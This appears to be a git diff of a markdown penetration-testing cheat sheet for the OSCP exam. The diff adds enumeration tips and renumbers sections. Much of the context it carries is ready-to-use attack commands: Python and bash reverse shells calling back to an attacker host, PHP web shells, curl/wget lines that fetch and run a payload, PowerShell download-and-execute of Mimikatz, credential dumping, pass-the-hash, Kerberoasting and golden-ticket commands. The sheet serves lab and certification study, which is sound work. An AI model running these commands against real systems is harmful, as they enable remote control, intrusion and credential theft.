@@ -10,6 +10,21 @@
 
 ## 2. Enumeration
 
+### ❗ENUMERATE HARDER❗
+
+The motto of OffSec is **try harder**, but this practicially means **enumerate harder**
+
+❗Try harder ≠ brute force❗
+
+Try harder means you missed something that was not enumerated, and this can sometimes mean:
+
+1. There a a port in nmap result that is not checked, just `nc` to the port and see the banner (there may be version number or unique strings that you can Google)
+2. Run the same [web scan](#22-httphttps-804438080) with a bigger wordlist - there will never be an empty web server with default web page, there must be something in it
+
+If `searchsploit` doesn't work, try Google - examples that Googling worked: [ITSL:Mousekatool2](/practice/itsl/2021-10-04-mousekatool2.md), [ITSL:Checks](/practice/itsl/2021-11-22-Checks.md), [digitalworld.local:JOY](/practice/vulnhub/digitalworld.local-joy.md)
+
+If Google doesn't work, there’s probably no public exploit for it; perhaps the answer is under your nose, e.g. secrets in the pwd of your shell (or 1 level above/below) - example: [digitalworld.local:JOY](/practice/vulnhub/digitalworld.local-joy.md)
+
 ### 2.1. FTP `21`
 
 ```console
@@ -89,15 +104,23 @@ hydra -L users.txt -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/bru
 2. `/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt`
 3. `/usr/share/seclists/Usernames/Names/names.txt`
 
-## 3. Shells
+## 3. Web Penetration
 
-### 3.1. Listener
+|Name|Link|
+|---|---|
+|DVWA Guide 2019|<https://github.com/mrudnitsky/dvwa-guide-2019>|
+|DVWA LFI/RFI|<https://medium.com/@manjuteju008/understanding-file-inclusion-attack-using-dvwa-web-application-30d06846c269>|
+|SQL injection examples|[DC-9](/practice/vulnhub/dc-9.md), [DVWA SQL Injection](/dvwa-sqli.md), [SQLi Labs](/sqli-labs.md)|
+
+## 4. Shells
+
+### 4.1. Listener
 
 ```console
 rlwrap nc -nlvp 4444
 ```
 
-### 3.2. Various reverse shells
+### 4.2. Various reverse shells
 
 #### Netcat Traditional
 
@@ -125,7 +148,7 @@ bash -i >& /dev/tcp/$KALI/4444 0>&1
 
 #### Python
 
-[Used in: digitalworld.local:JOY](https://github.com/joetanx/oscp/blob/main/practice/vulnhub/digitalworld.local-joy.md)
+[Used in: digitalworld.local:JOY](/practice/vulnhub/digitalworld.local-joy.md)
 
 ```console
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -150,10 +173,10 @@ To run in a PHP file: change `php -r '$COMMAND_BLOCK'` to `<?php $COMMAND_BLOCK 
 |   |   |
 |---|---|
 |`<?php echo passthru($_GET['k']);?>`|[Used in: ITSL:Dealer 313](/practice/itsl/2021-10-24-Dealer313.md)|
-|`<?php system($_GET[base64_decode('Y21k')]);?>`|[Used in: ITSL: VulnDC2](/practice/itsl/2022-01-17-Vulndc2.md)|
+|`<?php system($_GET[base64_decode('Y21k')]);?>`|[Used in: ITSL:VulnDC2](/practice/itsl/2022-01-17-Vulndc2.md)|
 |`<?php echo passthru($_GET['cmd']); ?>`|[Used in: digitalworld.local:JOY](/practice/vulnhub/digitalworld.local-joy.md)|
 
-### 3.3. Payloads
+### 4.3. Payloads
 
 #### MSFVenom reverse shell TCP:
 
@@ -180,7 +203,7 @@ sed -i 's/<ADDRESS>/$KALI/' reverse.ps1
 sed -i 's/<PORT>/4444/' reverse.ps1
 ```
 
-### 3.4. Execute payloads
+### 4.4. Execute payloads
 
 #### Windows: Execute reverse shell TCP payload
 
@@ -206,7 +229,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Ne
 |cURL|`curl -O http://$KALI/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
 |Wget|`wget http://$KALI/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
 
-### 3.5. Windows direct connection
+### 4.5. Windows direct connection
 
 #### evil-winrm
 
@@ -228,7 +251,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Ne
 |Username/password|`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|
 |Password hashes|`impacket-psexec -hashes $LM_HASH:$NT_HASH [$DOMAIN/]$USERNAME@$TARGET [$COMMAND]`|
 
-### 3.6. Upgrade to Full TTY
+### 4.6. Upgrade to Full TTY
 
 [Used in: digitalworld.local:JOY](/practice/vulnhub/digitalworld.local-joy.md)
 
@@ -236,9 +259,9 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Ne
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-## 4. File transfers
+## 5. File transfers
 
-### 4.1. HTTP
+### 5.1. HTTP
 
 #### Download
 
@@ -288,7 +311,7 @@ curl -o /var/www/html/upload.php https://raw.githubusercontent.com/joetanx/oscp/
 |PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).UploadFile('http://$KALI/upload.php','$FILENAME')`|
 |cURL|`curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"$FILENAME" -v http://$KALI/upload.php`|
 
-### 4.2. SMB
+### 5.2. SMB
 
 <details>
   <summary>Samba setup:</summary>
@@ -319,7 +342,7 @@ EOF
 |Download|`copy \\$KALI\public\$FILENAME .\`|
 |Upload|`copy "$FILENAME" \\$KALI\public\`|
 
-### 4.3. FTP
+### 5.3. FTP
 
 <details>
   <summary>FTP anonymous setup:</summary>
@@ -338,9 +361,9 @@ ftp -A $KALI
 ftp> get $FILENAME
 ```
 
-## 5. [Port forwarding](/port-forwarding.md)
+## 6. [Port forwarding](/port-forwarding.md)
 
-### 5.1. SSH port forwarding
+### 6.1. SSH port forwarding
 
 |   |   |
 |---|---|
@@ -349,7 +372,7 @@ ftp> get $FILENAME
 |Remote (static)|`ssh -R 0.0.0.0:$PORT_ON_KALI:$TARGET:$PORT_ON_TARGET root@$KALI`|
 |Remote (dynamic)|`ssh -R 0.0.0.0:$PORT_ON_KALI root@$KALI`|
 
-### 5.2. [Chisel](https://github.com/jpillora/chisel)
+### 6.2. [Chisel](https://github.com/jpillora/chisel)
 
 <details>
   <summary>Preparing chisel binaries:</summary>
@@ -385,7 +408,7 @@ certutil.exe -urlcache -f -split http://$KALI/chisel.exe %TEMP%\chisel.exe
 |Reverse static|`chisel client $KALI R:$PORT_ON_KALI:$TARGET:$PORT_ON_TARGET`|
 |Reverse dynamic|`chisel client $KALI R:socks`|
 
-## 5.3. Proxy Chains
+## 6.3. Proxy Chains
 
 <details>
   <summary>Config: <code>/etc/proxychains4.conf</code></summary>
@@ -405,7 +428,7 @@ socks5  $KALI 1080
 proxychains nmap -p- -A $TARGET_INTERNAL_NETWORK
 ```
 
-## 6. Linux privilege escalation
+## 7. Linux privilege escalation
 
 #### [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 
@@ -416,7 +439,7 @@ proxychains nmap -p- -A $TARGET_INTERNAL_NETWORK
 |Prepare Kali|`curl -L -o /var/www/html/linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/download/20221211/linpeas.sh`|
 |Download and run on target|`curl -O http://$KALI/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh`|
 
-## 7. Windows privilege escalation
+## 8. Windows privilege escalation
 
 ### [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
@@ -513,9 +536,11 @@ Invoke-PrivescCheck
 |Prepare Kali|`curl -L -o /var/www/html/winPEAS.bat https://github.com/carlospolop/PEASS-ng/releases/download/20221211/winPEAS.bat`|
 |Download and run on target|`certutil.exe /urlcache /f /split http://$KALI/winPEAS.bat %TEMP%\winPEAS.bat && %TEMP%\winPEAS.bat`|
 
-## 8. Active Directory
+## 9. Active Directory
 
-### 8.1. [AS-REP roasting](/attacking-active-directory.md#1-as-rep-roasting)
+Used in: [VulnDC](/practice/itsl/2022-01-10-VulnDC.md), [VulnDC2](/practice/itsl/2022-01-17-Vulndc2.md)
+
+### 9.1. [AS-REP roasting](/attacking-active-directory.md#1-as-rep-roasting)
 
 |   |   |
 |---|---|
@@ -525,7 +550,7 @@ Invoke-PrivescCheck
 |Use hashcat to crack the hashes|`hashcat -m 18200 $HASH_FILE /usr/share/wordlists/rockyou.txt`|
 |Connec to target|`evil-winrm -i #TARGET -u $USERNAME -p $PASSWORD`<br>`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|
 
-### 8.2. [Password dumping](/attacking-active-directory.md#2-cached-credential-storage-and-retrieval)
+### 9.2. [Password dumping](/attacking-active-directory.md#2-cached-credential-storage-and-retrieval)
 
 Preparing:
 
@@ -546,7 +571,7 @@ mimikatz.exe "privilege::debug token::elevate lsadump::dcsync /user:domain\krbtg
 powershell.exe iex (New-Object Net.WebClient).DownloadString('http://$KALI/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds
 ```
 
-### 8.3. [Pass the hash](/attacking-active-directory.md#3-pass-the-hash)
+### 9.3. [Pass the hash](/attacking-active-directory.md#3-pass-the-hash)
 
 |   |   |
 |---|---|
@@ -555,7 +580,7 @@ powershell.exe iex (New-Object Net.WebClient).DownloadString('http://$KALI/Invok
 |pth-winexe|`pth-winexe -U [$DOMAIN/]$USERNAME%$LM_HASH:$NT_HASH //TARGET cmd.exe`|
 |sekurlsa::pth + PsExec|`sekurlsa::pth /user:domainadmin /domain:$DOMAINx /ntlm:$NT_HASH`<br>`PsExec \\$TARGET cmd.exe`|
 
-### 8.4. [Kerberoasting](/attacking-active-directory.md#42-kerberoasting)
+### 9.4. [Kerberoasting](/attacking-active-directory.md#42-kerberoasting)
 
 Option 1: `Invoke-Kerberoast.ps1`
 
@@ -576,9 +601,9 @@ Cracking service account hash using hashcat
 hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
 ```
 
-### 8.5. Getting tickets
+### 9.5. Getting tickets
 
-#### 8.5.1. [Silver ticket](/attacking-active-directory.md#43-silver-ticket)
+#### 9.5.1. [Silver ticket](/attacking-active-directory.md#43-silver-ticket)
 
 ```cmd
 whoami /user
@@ -587,7 +612,7 @@ mimikatz # kerberos::purge
 mimikatz # kerberos::golden /user:$USERNAME /domain:$DOMAIN /sid:$DOMAIN_SID /id:$USER_SID /target:$TARGET /service:$SERVICE /rc4:$SERVICE_ACCOUNT_PASSWORD_HASH /ptt
 ```
 
-#### 8.5.2. [Golden ticket](/attacking-active-directory.md#5-golden-ticket)
+#### 9.5.2. [Golden ticket](/attacking-active-directory.md#5-golden-ticket)
 
 Option 1: `impacket`
 
@@ -610,11 +635,11 @@ mimikatz # misc::cmd
 PsExec.exe \\$TARGET cmd.exe
 ```
 
-## 9. Exam proofs
+## 10. Exam proofs
 
 |OS|Finding|Printing|
 |---|---|---|
 |Linux|`dir /S *proof.txt`|`hostname`<br>`cat /path/to/flag/proof.txt`<br>`ifconfig`|
 |Windows|`find / -name proof.txt`|`hostname`<br>`type C:\path\to\flag\proof.txt`<br>`ipconfig`|
 
-## 10. References
+## 11. References
